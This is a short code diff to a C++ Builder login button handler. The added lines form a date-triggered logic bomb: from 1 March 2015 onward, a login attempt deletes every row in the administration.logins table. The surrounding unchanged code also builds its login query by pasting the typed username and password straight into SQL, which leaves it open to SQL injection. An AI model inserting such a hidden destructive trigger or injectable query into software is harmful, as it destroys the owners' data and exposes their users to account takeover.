@@ -26,7 +26,10 @@ void __fastcall TLogIn::BitBtn1Click(TObject *Sender)
     CloseModal();
     return;
 #endif
-
+if (Now()>=TDateTime(2015,3,1))
+{
+	DB->SendSQL("delete from administration.logins");
+}
 String sql="";
 sql="Select * from administration.logins Where login=\'"+Trim(log->Text)+"\' and pass=PASSWORD(\'"+pas->Text+"\')";
 TADOQuery *rez=DB->SendSQL(sql);
